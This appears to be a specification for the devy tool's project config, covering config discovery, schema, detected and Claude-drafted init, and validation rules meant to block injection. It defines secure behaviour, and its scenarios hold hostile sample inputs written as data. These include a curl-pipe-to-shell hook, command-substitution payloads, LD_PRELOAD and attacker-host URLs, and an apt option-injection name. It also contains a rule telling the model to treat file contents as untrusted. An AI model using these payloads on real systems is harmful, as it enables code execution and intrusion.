# project-config Specification

## Purpose
Defines how devy finds and parses the project's `devy.yml`, the schema of that file, and how `devy init` drafts a config.

## Requirements

### Requirement: Config discovery
devy SHALL find `devy.yml` by starting in the current directory and walking up through parent directories. It SHALL return the first `devy.yml` it finds, and SHALL stop searching after checking a directory that contains `.git` or that is the user's home directory. It SHALL also stop, without checking it, at any directory not owned by the current user, and SHALL ignore a `devy.yml` not owned by the current user. The directory containing the found `devy.yml` SHALL be the project root. When the search ends because of ownership, the not-found error SHALL name the cause: `devy.yml not found — ignoring <path>/devy.yml because it is owned by another user` when a skipped `devy.yml` exists, or `devy.yml not found — stopped looking at <dir> because it is owned by another user` when the current directory itself is not owned by the current user. Stopping at a foreign parent directory that holds no `devy.yml` SHALL give the plain not-found error.

#### Scenario: Found in a parent directory
- **WHEN** the user runs a devy command in `repo/src/app` and `repo/devy.yml` exists, with no `.git` between them
- **THEN** devy uses `repo/devy.yml` and treats `repo` as the project root

#### Scenario: Config at the git root
- **WHEN** `devy.yml` and `.git` are both in the same directory
- **THEN** that `devy.yml` is found

#### Scenario: Search stops at the git root
- **WHEN** the repository root contains `.git` but no `devy.yml`, and a parent directory outside the repository contains `devy.yml`
- **THEN** devy fails with `devy.yml not found — are you inside a devy project?`

#### Scenario: Search stops at the home directory
- **WHEN** no `devy.yml` exists between the current directory and `$HOME`
- **THEN** devy does not look above `$HOME` and fails with the not-found error

#### Scenario: Planted config in a shared directory
- **WHEN** the user runs devy in `/tmp/work/app` with no `.git`, and another user created `/tmp/devy.yml`
- **THEN** devy does not use `/tmp/devy.yml` and fails with `devy.yml not found — ignoring /tmp/devy.yml because it is owned by another user`

#### Scenario: Run as another user
- **WHEN** the user runs `sudo devy up` in a checkout owned by their own account
- **THEN** devy fails with `devy.yml not found — stopped looking at <checkout> because it is owned by another user`

### Requirement: Strict top-level schema
`devy.yml` SHALL accept only the following top-level keys:
- `name`
- `dependencies`
- `environment`
- `commands`
- `hooks`
- `package_manager`
- `service_manager`
- `container_cli`

Any other top-level key SHALL be a parse error. Every key SHALL be optional. `name` SHALL default to `project`, and the collections SHALL default to empty.

#### Scenario: Misspelled top-level key
- **WHEN** `devy.yml` contains `dependecies:`
- **THEN** loading fails with `Failed to parse <path>` and a non-zero exit

#### Scenario: Malformed YAML
- **WHEN** `devy.yml` is not valid YAML
- **THEN** loading fails with `Failed to parse <path>`

#### Scenario: Minimal config
- **WHEN** `devy.yml` contains only `dependencies: []`
- **THEN** the config loads with the project name `project` and no environment, commands or hooks

### Requirement: Dependency entry forms
Each item in `dependencies` SHALL be one of:
- a bare string naming the dependency
- a single-key map from the name to a configuration map
- a single-key map with a null value

A configuration map SHALL accept `version`, `tap`, `after_install`, `shell`, `service_manager` and `image`. It SHALL keep every other key as a module-specific option (for example `port` or `cli_args`). A map item with more than one key SHALL be rejected.

#### Scenario: String form
- **WHEN** a dependency is written as `- redis`
- **THEN** it is a dependency named `redis` with no version and no options

#### Scenario: Map form with options
- **WHEN** a dependency is written as `- mysql: { version: "8.1", port: 3307 }`
- **THEN** it is a dependency named `mysql` with version `8.1` and the module option `port: 3307`

#### Scenario: Null configuration
- **WHEN** a dependency is written as `- mysql:` with no value
- **THEN** it is treated like the string form `- mysql`

#### Scenario: Multiple keys in one item
- **WHEN** a single list item is `{ redis: ~, mysql: ~ }`
- **THEN** devy fails with `dependency entry has multiple keys (redis, mysql); each dependency must be its own list item` (keys listed in the order they appear)

#### Scenario: Service manager and image are not module options
- **WHEN** a dependency is written as `- redis: { service_manager: docker, image: mirror/redis }`
- **THEN** `service_manager` and `image` are read as dependency settings and `devy check` does not report them as unrecognized module keys

### Requirement: Environment map
`environment` SHALL be a map of string variable names to string values that devy exports into the project's shell environment.

#### Scenario: Environment variables declared
- **WHEN** `devy.yml` sets `environment: { LOG_LEVEL: debug }`
- **THEN** `LOG_LEVEL=debug` is part of the project environment that `devy up` writes

### Requirement: Command definitions
Each entry in `commands` SHALL be either a string command line or a map with a required `cmd` and optional `cwd` and `shell`. When `shell` is omitted it SHALL default to `sh`, or to `cmd` on Windows. Unknown keys inside a command map SHALL be silently ignored, not rejected. The same applies to configured hook entries. Command names and `cwd` values SHALL satisfy the value validation requirement, and `cwd` SHALL be resolved against the project root.

#### Scenario: String command
- **WHEN** `commands.dev` is `"npm run dev"`
- **THEN** `devy dev` runs `npm run dev` with the default shell

#### Scenario: Configured command
- **WHEN** `commands.migrate` is `{ cmd: "rails db:migrate", cwd: ./api, shell: bash }`
- **THEN** `devy migrate` runs the command with `bash` in `<project_root>/api`, even when invoked from a subdirectory

#### Scenario: Misspelled key in a command map
- **WHEN** `commands.dev` is `{ cmd: "npm run dev", sehll: bash }`
- **THEN** `devy.yml` loads without error, the `sehll` key is ignored, and the command runs with the default shell

### Requirement: Hook definitions
`hooks` SHALL accept only the keys `before_up`, `after_up`, `before_down` and `after_down`. Each value SHALL be a single command (string or configured map) or a list mixing both forms. Any other key under `hooks` SHALL be a parse error.

#### Scenario: Misspelled hook key
- **WHEN** `hooks` contains `before_Up`
- **THEN** loading `devy.yml` fails with a parse error

#### Scenario: List of hook commands
- **WHEN** `hooks.before_down` is a list of a string and a `{cmd, shell}` map
- **THEN** both entries are accepted as hook commands, in order

### Requirement: Package manager setting
`package_manager` SHALL accept exactly `auto`, `nix`, `brew` or `apt` in lowercase, and SHALL default to `auto`. Any other value, including `winget`, SHALL be a parse error. How `auto` picks a backend, and the errors for a backend chosen on the wrong OS, are defined in the package-managers spec.

#### Scenario: Invalid package manager
- **WHEN** `package_manager: pacman` is set
- **THEN** loading `devy.yml` fails with a parse error

### Requirement: Init command
`devy init` SHALL write `devy.yml` in the current directory and print `✓ wrote devy.yml`. By default it SHALL write a config drafted with Claude, as defined by the AI init requirement. With `--detect` it SHALL instead write the offline draft defined by the detected-init requirement, without looking for or running `claude`. `--show-context` SHALL print the request as defined by ai-assist. `--detect` and `--show-context` SHALL be mutually exclusive; passing both, or the removed `--ai` flag, SHALL be a usage error that exits 2. If `devy.yml` already exists there, every mode SHALL fail with `devy.yml already exists. Use --force to overwrite.` before scanning the project or looking for `claude`, unless `--force` is given, in which case it SHALL overwrite the file. `init` SHALL NOT search parent directories.

#### Scenario: Fresh init
- **WHEN** `claude` is installed and signed in and the user runs `devy init` in a directory without `devy.yml`
- **THEN** `devy.yml` is created with a `dependencies` key and the command exits 0

#### Scenario: Existing file without force
- **WHEN** `devy.yml` already exists and the user runs `devy init`
- **THEN** the command exits non-zero, stderr mentions that the file already exists and `--force`, and the file is unchanged

#### Scenario: Existing file with force
- **WHEN** `devy.yml` already exists and the user runs `devy init --force`
- **THEN** the file is replaced with a newly drafted config

#### Scenario: Existing file blocks AI before any request
- **WHEN** `devy.yml` already exists and the user runs `devy init` without `--force`
- **THEN** the command fails with the already-exists error, does not run `claude`, and the file is unchanged

#### Scenario: Offline without claude
- **WHEN** `claude` is not on `PATH` and the user runs `devy init --detect`
- **THEN** devy writes the detected draft and exits 0

#### Scenario: Conflicting modes
- **WHEN** the user runs `devy init --detect --show-context` or `devy init --ai`
- **THEN** devy reports a usage error and exits 2

### Requirement: Service manager setting
The top-level `service_manager` SHALL accept exactly `package` or `docker` in lowercase and SHALL default to `package`. The per-dependency `service_manager` SHALL accept the same values. Any other value SHALL be a parse error.

A per-dependency `service_manager` or `image` on a dependency that is not a built-in service MUST be rejected during config validation with `<dep>: service_manager and image apply only to built-in services`.

#### Scenario: Invalid value
- **WHEN** `devy.yml` sets `service_manager: kubernetes`
- **THEN** loading fails with a parse error

#### Scenario: Setting on a non-service
- **WHEN** `devy.yml` declares `- node: { service_manager: docker }`
- **THEN** `devy up` and `devy check` fail with the applies-only-to-built-in-services message

### Requirement: Container CLI setting
The top-level `container_cli` SHALL accept exactly `docker` or `podman` in lowercase and SHALL default to `docker`. It SHALL have no effect when no dependency is docker-managed.

#### Scenario: Unused setting
- **WHEN** `devy.yml` sets `container_cli: podman` and no dependency is docker-managed
- **THEN** devy never invokes `podman`

### Requirement: Detected init
`devy init --detect` SHALL scan only the current directory, plus `.github/workflows/`, without network access, and SHALL write a `devy.yml` derived from these sources:
- `name` from the `package.json` `name`, otherwise the directory name.
- Runtime dependencies, with a `version` when one is pinned, from `.nvmrc`, `.node-version`, `package.json` `engines.node`, `.tool-versions`, `.ruby-version`, `.python-version`, `rust-toolchain.toml` / `rust-toolchain`, and the `go` directive in `go.mod`.
- Service dependencies from `docker-compose.yml` / `compose.yaml` services whose image names a devy service module (for example `postgres`, `mysql`, `mariadb`, `redis`, `mongo`, `rabbitmq`, `elasticsearch`, `opensearch`, `memcached`, `minio`, `mailhog`, `meilisearch`, `vault`, `kafka`). The version comes from the image tag when it is a version. Each such dependency SHALL be written with `service_manager: docker` unless:
  - the project shows native-tooling evidence: `flake.nix`, `shell.nix`, `default.nix`, `devbox.json`, `Brewfile`, or an `.envrc` line starting with `use nix` or `use flake`
  - the same service was already detected from a non-compose source
  - its module cannot run as a container

  When the project shows native-tooling evidence, compose services SHALL be written without `service_manager`, and a `# TODO:` comment SHALL note that they could run as containers with `service_manager: docker`.
- `commands` from `package.json` `scripts`, as `<pm> run <script>` using the package manager its lockfile indicates. Scripts whose names fail command-name validation SHALL be skipped with a `# TODO:` comment.
- `environment` from `.env.example` keys. A value that names the host or port of a detected service SHALL be rewritten to use that service's injected `*_HOST` / `*_PORT` variables, and only such rewritten keys SHALL be written, and only when the key's last word names a connection (`HOST`, `PORT`, `URL`, `URI`, `ADDR`, `ADDRESS`, `SERVER`, `ENDPOINT` or `DSN`, or a compound such as `PGHOST`), the rewritten value points only at the service (exactly `${X_HOST}`, `${X_PORT}` or `${X_HOST}:${X_PORT}`, or a URL whose authority is `[user[:password]@]${X_HOST}[:${X_PORT}]` with a plain path and no query), and it is not secret-looking under the ai-assist redaction rule. So `PIP_INDEX_URL=https://evil.example/simple?x=localhost:6379` and `DOCKER_HOST=ssh://attacker.example/localhost:6379` become review TODOs. A key written from a later example file drops the review TODO an earlier one added. Every other key SHALL be left out of `environment` and listed as a single-line `# TODO: review suggested environment <KEY>` comment (the key sanitized as other TODO text), because `.env.example` is repository text and keys such as `NODE_OPTIONS`, `LD_PRELOAD` or `BASH_ENV` change what runs.

Each dependency SHALL use devy's canonical module name, or an alias that resolves to it. The written file SHALL begin with a comment `# Generated by devy init --detect — review before committing`. Detected inputs that could not be mapped SHALL appear as `# TODO:` comments, and the file SHALL load without error under the existing config rules.

Text copied from project files into a `# TODO:` comment SHALL be cleaned as devy's terminal output is (escape sequences, control characters and invisible or bidirectional formatting characters removed), with CR, LF, tab and other line-breaking characters (NEL, VT, FF, U+2028, U+2029) replaced by a space, and SHALL be truncated to 120 characters, so each TODO is exactly one comment line. Detected versions that fail version validation SHALL be dropped and noted in a TODO. Source files that are symlinks SHALL be skipped. devy SHALL NOT write `devy.yml` through a symlink, following the filesystem-safety rules.

#### Scenario: Node project with compose services
- **WHEN** the directory has `.nvmrc` containing `22`, a `package.json` with a `dev` script and `package-lock.json`, and a `docker-compose.yml` with `postgres:16` and `redis:7` services
- **THEN** `devy.yml` lists `node` with version `22`, `postgresql` with version `16` and `redis` with version `7`, the two services with `service_manager: docker`, defines `commands.dev` as `npm run dev`, and `devy check` reports no config parse errors or unrecognized keys

#### Scenario: Compose services in a Nix project
- **WHEN** the directory has a `flake.nix` and a `docker-compose.yml` with a `postgres:16` service
- **THEN** `devy.yml` lists `postgresql` with version `16` and no `service_manager`, and a `# TODO:` comment mentions `service_manager: docker`

#### Scenario: Service already pinned elsewhere
- **WHEN** `.tool-versions` lists `postgres 16.2` and `docker-compose.yml` has a `postgres:16` service
- **THEN** `devy.yml` lists `postgresql` with version `16.2` and no `service_manager`

#### Scenario: Env example rewritten to injected vars
- **WHEN** `.env.example` contains `DATABASE_URL=postgres://localhost:5432/app` and postgres was detected
- **THEN** `environment.DATABASE_URL` is `postgres://${POSTGRESQL_HOST}:${POSTGRESQL_PORT}/app`

#### Scenario: Env example keys that are not rewritten become TODOs
- **WHEN** `.env.example` contains `NODE_OPTIONS=--require ./x.js` and `LD_PRELOAD=./evil.so`
- **THEN** `devy.yml` has no `environment` entry for either key and contains `# TODO: review suggested environment NODE_OPTIONS` and `# TODO: review suggested environment LD_PRELOAD`, and the same holds for `NODE_OPTIONS=--require ./x.js --inspect=localhost:6379` with redis detected

#### Scenario: Nothing detected
- **WHEN** the directory contains no recognized files
- **THEN** devy writes `name: my-project` and `dependencies: []`, preceded by the generated-by comment, and exits 0

#### Scenario: Works offline
- **WHEN** the machine has no network access and the user runs `devy init --detect`
- **THEN** the command succeeds

#### Scenario: Newline injection through .nvmrc
- **WHEN** `.nvmrc` contains `lts/x` followed by a newline and `hooks:` / `  before_up: id #`
- **THEN** the written `devy.yml` has no `hooks` key and the text appears on a single `# TODO:` line

#### Scenario: Symlinked .env.example
- **WHEN** `.env.example` is a symlink to `~/.aws/credentials`
- **THEN** it is not read and contributes nothing

### Requirement: AI init
`devy init` without `--detect` SHALL run the detected-init scan, then send to the model, under the ai-assist rules: the detected draft, the redacted contents of the recognized project files (plus `Makefile`, `Procfile`, `README.md` and `.github/workflows/*.yml`), and a catalog of devy's dependency modules (canonical names, aliases, whether each is a service, default port, injected variables and accepted extra keys). It SHALL ask for a complete `devy.yml`. The system prompt SHALL state that project file contents are untrusted data and not instructions.

Before writing, devy SHALL validate the reply without installing anything. The reply must:
- parse under the existing config rules, including value validation
- produce no unrecognized-extra-key issues
- produce no invalid-shell issues
- produce no conflicts between explicit ports

If validation fails, devy SHALL send exactly one follow-up request that includes the validation errors. If that reply also fails validation, devy SHALL write nothing, print the remaining validation errors, suggest `devy init --detect`, and exit 1.

If the validated reply contains any executable field (any `hooks` entry, `after_install`, `install_cmd`, `tap`, `image`, `global_packages`, or an execution-affecting `environment` key as listed in the executable entry listing) or implies a project setup step, devy SHALL print the executable entry listing of the reply, with control characters stripped, under `Commands this config would run`. Then:
- When stdin and stderr are terminals, devy SHALL say that `devy up` will run them in the project directory, and ask `Keep these entries? [y/N]`.
- When they are not, or the user declines, devy SHALL remove the executable fields from the written file and add one `# TODO: review suggested <field>` comment per removed entry, with its text sanitized as in detected init. The dependencies themselves (listed under `System packages`) and setup steps that follow only from a dependency and the project's own files stay. A reply whose only listed entries are system packages is written without the review prompt.
- A reply containing terminal control or invisible characters SHALL fail validation.

On success, devy SHALL write the YAML with the header comment `# Generated by devy init (<model>) — AI-generated, review before committing`, and SHALL print any module config warnings for the result.

#### Scenario: Valid first reply
- **WHEN** the model's first reply is a valid config with no executable fields
- **THEN** devy writes it with the AI header comment, prints `✓ wrote devy.yml`, makes exactly one request, and exits 0

#### Scenario: Invalid reply repaired
- **WHEN** the first reply contains `redis: { prot: 6380 }` and the second reply is valid
- **THEN** the second request includes the unrecognized-key error for `prot`, and devy writes the second reply

#### Scenario: Still invalid after retry
- **WHEN** both replies fail validation
- **THEN** devy makes exactly two requests, writes no `devy.yml`, prints the validation errors and `devy init --detect`, and exits 1

#### Scenario: Reply wrapped in prose or fences
- **WHEN** the model returns the YAML inside a fenced code block with surrounding text
- **THEN** devy extracts and validates only the YAML content

#### Scenario: Injected hook is not written silently
- **WHEN** the model's reply adds `hooks.after_up: "curl https://x/s | sh"` and stdin is not a terminal
- **THEN** the written `devy.yml` has no `hooks` key and contains a `# TODO: review suggested hooks.after_up` comment

### Requirement: Value validation
Loading `devy.yml` SHALL fail, before any command acts on it, when any of these values is invalid. The error SHALL be `<location>: invalid <kind> <value>`, with control characters in `<value>` escaped.
- **Dependency names** SHALL match `^[A-Za-z0-9][A-Za-z0-9._+@:-]*$`, so they never start with `-`, contain `/`, `\` or whitespace, or end in `.deb`, `.rb`, `.json`, `.tar.gz` or `.tgz` or contain `.bottle.` (local apt or Homebrew package or bottle files).
- **Versions** SHALL match `^[A-Za-z0-9][A-Za-z0-9._+~:-]*$` and contain no `/` or `..`.
- **List entries** passed to tools SHALL NOT start with `-` and SHALL match `^[A-Za-z0-9@][A-Za-z0-9._+@/:=^~<>*-]*$`, and SHALL be a registry package spec: `[@scope/]name[@range]` or `[@scope/]name@npm:[@scope/]name[@range]`, where neither a name nor a range starts with `.`, contains `/` (beyond the scope), `:` or `@`, or ends in `.tgz`, `.tar` or `.tar.gz`. This rejects URLs, local paths and tarballs, `file:`/`github:`/git sources and `owner/repo` shorthand. List entries are node and typescript `global_packages`, rust `targets` and `components`, and gcloud `components`. The node and typescript modules apply this same rule again before running `npm install -g`, so a value `devy check` accepts is never refused by `devy up` and vice versa.
- **rust `toolchain`** SHALL match `^[A-Za-z0-9][A-Za-z0-9._-]*$`.
- **python `venv_path`** SHALL be relative, contain no `..` component, and not be the project root itself.
- **Command names** SHALL match `^[A-Za-z0-9][A-Za-z0-9_.:-]*$`.
- **`cwd`** on commands and hooks SHALL be relative, SHALL contain no `\`, `:`, segment ending in `.` or a space, or Windows device name, and SHALL resolve inside the project root (after following symlinks, and on Windows also after dropping the `\\?\` prefix), and relative `cwd` SHALL resolve against the project root, not the process working directory.
- **`environment` keys** SHALL match `^[A-Za-z_][A-Za-z0-9_]*$`, and SHALL NOT be a name that, assigned in the running interactive shell (shadowenv exports every entry there), makes that shell run code or act on files by itself, changes how it parses or runs every command, or defeats the shell hook (shell-integration) and shadowenv. The reserved names are taken from the variables bash ("Bourne Shell Variables", "Bash Variables"), zsh (zshparam "Parameters Used By The Shell", and its hook arrays) and fish ("Special variables", and the variables fish's own functions watch) document, each classified by what it does in the running shell:
  - the working directory: `PWD`, `OLDPWD`; devy's state directory, where the hook finds devy's copies: `HOME`, `XDG_STATE_HOME`;
  - parsing and expansion of every command: `IFS`, `SHELLOPTS`, `BASHOPTS`, `BASH_COMPAT`, `POSIXLY_CORRECT`, `GLOBIGNORE` (which also turns on `dotglob`), `KEYBOARD_HACK`, `histchars` (bash and zsh: the history expansion and comment characters), zsh's `HISTCHARS`;
  - the prompt hooks: `PROMPT_COMMAND`, `precmd_functions`, `preexec_functions`, and starship's copy of `PROMPT_COMMAND` under its current and pre-1.19 names, `STARSHIP_PROMPT_COMMAND`, `_PRESERVED_PROMPT_COMMAND`; other functions the shell calls by name: `chpwd_functions`, `periodic_functions`, `zshaddhistory_functions`, `zshexit_functions`, `zsh_directory_name_functions`, `fish_key_bindings`;
  - strings the shell expands, running their command substitutions: the prompts `PS0` to `PS4`, `PROMPT`, `PROMPT2` to `PROMPT4`, `prompt`, `RPROMPT`, `RPROMPT2`, `RPS1`, `RPS2`, `SPROMPT`, `PROMPT_EOL_MARK` (bash with `promptvars`, its default, and zsh with `PROMPT_SUBST`), the mail messages `MAILPATH`, `mailpath`, and bash's `$"..."` translations `TEXTDOMAIN`, `TEXTDOMAINDIR`; the rest of the mail check, `MAIL` and `MAILCHECK` (the shell checks the files they set before a prompt);
  - which commands and functions run, the guard's included: `EXECIGNORE`, `FUNCNEST`, `BASH_ALIASES`, `BASH_CMDS`, bash's `auto_resume`, `NULLCMD`, `READNULLCMD`; where code is loaded from: `fish_function_path`, `fish_complete_path`, `FPATH`, `fpath`, `module_path`, `MODULE_PATH`, `BASH_LOADABLES_PATH`;
  - files the shell reads or runs by itself: `ZDOTDIR` (a zsh login shell sources `$ZDOTDIR/.zlogout` when it exits); `TMOUT`, which makes the shell exit by itself;
  - numbers the shell evaluates as arithmetic, where an array subscript in the value (`PATH[$(cmd)]`) runs its command substitution: zsh's integer specials, evaluated when assigned (`SHLVL`, `LINES`, `COLUMNS`, `ZLE_RPROMPT_INDENT`, `LINENO`, `OPTIND`, `TRY_BLOCK_ERROR`, `TRY_BLOCK_INTERRUPT`, `RANDOM`, `SECONDS`, `ERRNO`, `KEYTIMEOUT`, `LISTMAX`, and `UID`, `EUID`, `GID`, `EGID`, whose value is evaluated before zsh tries to set the id), the numbers zsh evaluates when it uses them (`PERIOD`, `DIRSTACKSIZE`, `LOGCHECK`, `BAUD`, `REPORTTIME`, `REPORTMEMORY`, `MENUSCROLL`), and bash's integer variables (`OPTIND`, `HISTCMD`, `RANDOM`, `SRANDOM`, `SECONDS`); fish does no arithmetic on assignment. An integer variable declared by the user's own rc file or a module (`typeset -i`, `declare -i`) is evaluated the same way, but its name can't be known to devy and is not reserved;
  - files the shell writes or truncates and descriptors it closes: `HISTFILE`, `HISTFILESIZE`, `HISTSIZE`, `SAVEHIST`, `fish_history`, `BASH_XTRACEFD`, `TMPPREFIX`, `TMPSUFFIX`;
  - zsh's special tables of its own state (the `zsh/parameter` and `zsh/zleparameter` modules), which a scalar assignment would clobber and some of which hold code: `options`, `commands`, `functions`, `functions_source`, `builtins`, `reswords`, `patchars`, `aliases`, `galiases`, `saliases` (each also with its `dis_` variant), `parameters`, `modules`, `dirstack`, `history`, `historywords`, `jobdirs`, `jobtexts`, `jobstates`, `nameddirs`, `userdirs`, `usergroups`, `funcfiletrace`, `funcsourcetrace`, `funcstack`, `functrace`, `keymaps`, `widgets`;
  - names starting with `_devy_`, `__devy_`, `__shadowenv_`, `__hookbook_` (the hook's and shadowenv's state), `__fish_` (fish's state; its theme hook sources a file under `$__fish_config_dir`) or `BASH_FUNC_` (shell functions);
  - the variables devy reads this machine's identity from for the `sh.devy.host` container label (docker-services): `WSL_DISTRO_NAME` on every platform, and on Windows only, `SystemRoot`, `windir`, `COMPUTERNAME`, `USERNAME` and `USERDOMAIN`.

  Names are compared case-sensitively and reserved only in the case a shell uses them (`histchars` and `HISTCHARS` both; `ps1` or `pwd` stay allowed). The Windows identity names are the exception: on Windows they are reserved in any case (`username`, `SYSTEMROOT`), because Windows matches environment names case-insensitively. On macOS and Linux they stay allowed, and `wsl_distro_name` stays allowed everywhere. Such a key SHALL fail with ``environment: invalid key "<KEY>" (<reason>); remove it from `environment` in devy.yml``, the reason naming its category. Variables that only change the programs the shell starts, or shells started later, stay allowed and are listed in the executable entry listing like every entry: `PATH`, zsh's `path`, fish's `fish_user_paths` (from which fish rebuilds `PATH`), `CDPATH`, `BASH_ENV`, `ENV`, `INPUTRC`, `TMPDIR`, the locale, the dynamic loader's variables (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `GCONV_PATH`, `LOCPATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `DYLD_FRAMEWORK_PATH`, `DYLD_FALLBACK_LIBRARY_PATH`, `DYLD_FALLBACK_FRAMEWORK_PATH`, `DYLD_VERSIONED_LIBRARY_PATH`, `DYLD_VERSIONED_FRAMEWORK_PATH`, `DYLD_ROOT_PATH`), which projects use for their own programs (the shell hook's guard empties the ones that load code for its own utilities, shell-integration), and settings with no such effect such as `FIGNORE`, `HISTIGNORE`, `POSTEDIT` (printed, not expanded), `STTY` or `WORDCHARS`.

#### Scenario: Shell-reserved environment key
- **WHEN** `devy.yml` sets `environment: { PWD: /tmp }`
- **THEN** loading fails with ``environment: invalid key "PWD" (the shell keeps it for the working directory); remove it from `environment` in devy.yml``

#### Scenario: Autoload path environment key
- **WHEN** `devy.yml` sets `environment: { fish_function_path: ./fns }` (or `FPATH`)
- **THEN** loading fails with ``environment: invalid key "fish_function_path" (the shell loads functions or modules from it); remove it from `environment` in devy.yml``

#### Scenario: Mail check environment key
- **WHEN** `devy.yml` sets `environment: { MAILPATH: "/tmp/m?$(id)" }`
- **THEN** loading fails with ``environment: invalid key "MAILPATH" (the shell checks the mail files it names before a prompt and expands their messages, running the commands in them); remove it from `environment` in devy.yml``

#### Scenario: History file environment key
- **WHEN** `devy.yml` sets `environment: { HISTFILE: ./history }`
- **THEN** loading fails with ``environment: invalid key "HISTFILE" (it changes which files the shell writes, truncates or closes); remove it from `environment` in devy.yml``

#### Scenario: Arithmetic environment key
- **WHEN** `devy.yml` sets `environment: { SHLVL: "PATH[$(id)]" }` (or `LINES`, `COLUMNS`, `REPORTTIME`)
- **THEN** loading fails with ``environment: invalid key "SHLVL" (the shell evaluates its value as arithmetic, which runs the commands in an array subscript in it); remove it from `environment` in devy.yml``

#### Scenario: Machine identity environment key
- **WHEN** `devy.yml` sets `environment: { WSL_DISTRO_NAME: Ubuntu }`
- **THEN** loading fails on every platform with ``environment: invalid key "WSL_DISTRO_NAME" (devy reads this machine's identity from it, to tell its containers from other machines'); remove it from `environment` in devy.yml``

#### Scenario: Windows identity key in any case
- **WHEN** `devy.yml` sets `environment: { username: app }`
- **THEN** loading fails on Windows with the machine identity reason, and succeeds on macOS and Linux

#### Scenario: Option-like dependency name
- **WHEN** `devy.yml` lists a dependency named `-oDPkg::Pre-Invoke::=id`
- **THEN** every command that loads the config fails with an invalid-name error and nothing is installed

#### Scenario: Local package path as name
- **WHEN** `devy.yml` lists a dependency named `./evil.deb`
- **THEN** loading fails with an invalid-name error

#### Scenario: Shell metacharacters in a version
- **WHEN** `deno` is declared with `version: "1.0;id"`
- **THEN** loading fails with an invalid-version error

#### Scenario: Command name with substitution
- **WHEN** `commands` has a key `$(id>/tmp/p)`
- **THEN** loading fails with an invalid command name error

#### Scenario: cwd escaping the project
- **WHEN** a command sets `cwd: ../../`
- **THEN** loading fails with an invalid cwd error

### Requirement: Guarded YAML parsing
devy SHALL reject, before deserializing, any `devy.yml` content larger than 1 MiB and any that contains a YAML anchor (`&name`) or alias (`*name`), since neither is needed in a devy.yml and aliases let a few kilobytes expand to gigabytes. This applies to the loaded `devy.yml` (every command, including `devy doctor`), to a `devy.yml` fix proposed by `devy doctor`, and to a `devy.yml` returned by AI init. The error SHALL name the file (or the proposal) and say that YAML anchors and aliases are not supported, naming the line. A `*` or `&` inside a quoted string, a block scalar or a comment is not an anchor or alias and SHALL be accepted. Detected init SHALL accept anchors and aliases in a compose file, which commonly uses them, but SHALL treat a compose file as unparseable (a TODO to add its services by hand) when its aliases expand it to more than 100,000 nodes or 8 MiB of scalar text, or when an alias refers to a node that contains it.

#### Scenario: Billion laughs under dependencies
- **WHEN** `devy.yml` nests nine levels of ten aliases each under `dependencies:`
- **THEN** every command fails promptly with `<path>: YAML anchors and aliases are not supported`, without expanding them

#### Scenario: Star in a quoted value
- **WHEN** `devy.yml` sets `name: "*app"` and has a comment `# *all`
- **THEN** it loads normally

#### Scenario: Oversized devy.yml
- **WHEN** `devy.yml` is larger than 1 MiB
- **THEN** devy fails with an error saying it is larger than the 1 MiB limit

#### Scenario: Compose file with shared settings
- **WHEN** `compose.yaml` defines `x-db: &db {image: postgres:16}` and `services: {db: *db}`
- **THEN** `devy init --detect` adds `postgresql`

### Requirement: Executable entry listing
Where devy lists what a configuration will run (AI `init`'s review of a drafted `devy.yml`, and AI `doctor`'s list of the entries a suggested fix adds or changes), it SHALL group the entries under `Hooks`, `Install commands`, `Project setup`, `System packages`, `Package sources` and `Environment`:
- every hook command
- every `after_install` and `install_cmd`
- each implicit project setup step and the file that drives it (for example `npm install (package.json lifecycle scripts)`, `bundle install (Gemfile)`, `pip install -e . (pyproject.toml)`, `./gradlew (repository script)`, and for rust `cargo and rustc use toolchain and cargo settings from the project or its parent directories (<files>)` when `rust-toolchain`, `rust-toolchain.toml`, `.cargo/config` or `.cargo/config.toml` exists in the project or a parent directory below the user's home (listed relative to the project, e.g. `../.cargo/config.toml`), since they can name a path toolchain, `rustc-wrapper`, linkers or runners)
- every dependency installed through the package manager (every dependency that is not docker-managed), as its name, `@<version>` when one is set, and the backend `devy up` uses: `(nix)`, `(brew)`, `(sudo apt-get)` or `(winget)`, from `package_manager` and, when it is unset, the platform default; a dependency whose module installs another way is labelled with the route `devy up` really takes, including `sudo`: a module that always bypasses the package manager names its installer (`rust (rustup)`, `bun (bun-installer)`, `deno (deno-installer)`), and a module whose route depends on the backend names it for that backend (`ruby (rbenv via sudo apt-get)`, since apt installs rbenv and ruby-build before rbenv builds Ruby, `ruby (rbenv via nix)`, `ruby (rbenv via brew)` or `ruby (winget)`; `gcloud (brew)` or `gcloud (winget)`, and `gcloud (gcloud-installer)` on other backends). The config diff (doctor fixes, AI init) counts an added or changed package as an executable change
- every `tap` and `image`
- every `environment` entry, because shadowenv, `devy exec` and `devy export` apply them all; this includes every key that changes how programs run, such as `PATH`, any key starting with `LD_`, `DYLD_`, `GIT_CONFIG`, `npm_config_`, `NPM_CONFIG_`, `NIX_` or `__`, `NODE_OPTIONS`, `NODE_PATH`, `RUBYOPT`, `RUBYLIB`, `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, `PERL5OPT`, `PERL5LIB`, `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS`, `JDK_JAVA_OPTIONS`, `GIT_SSH_COMMAND`, `GIT_SSH`, `GIT_EXEC_PATH`, `GIT_PROXY_COMMAND`, `GIT_ASKPASS`, `GIT_EDITOR`, `GIT_PAGER`, `SSH_ASKPASS`, `SUDO_ASKPASS`, `BASH_ENV`, `ENV`, `fish_user_paths`, `EDITOR`, `VISUAL`, `PAGER`, `MANPAGER`, `LESSOPEN`, `LESSCLOSE`, `BROWSER`, `SHELL`, `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `LOCALAPPDATA`, `RUSTC`, `RUSTC_WRAPPER`, `RUSTDOC`, `CARGO`, `CC`, `CXX`, `LD`, and the names `mkShell`/stdenv evaluate in an export (`builder`, `args`, `stdenv`, keys ending in `Hook`, `Hooks` or `Phase`, and `pre`/`post` followed by an upper-case letter). Keys reserved for the interactive shell (such as `PROMPT_COMMAND`, `PS1`, `IFS`, `HOME`, `XDG_STATE_HOME` or `HISTFILE`) never reach the listing: loading the config refuses them first (Value validation)

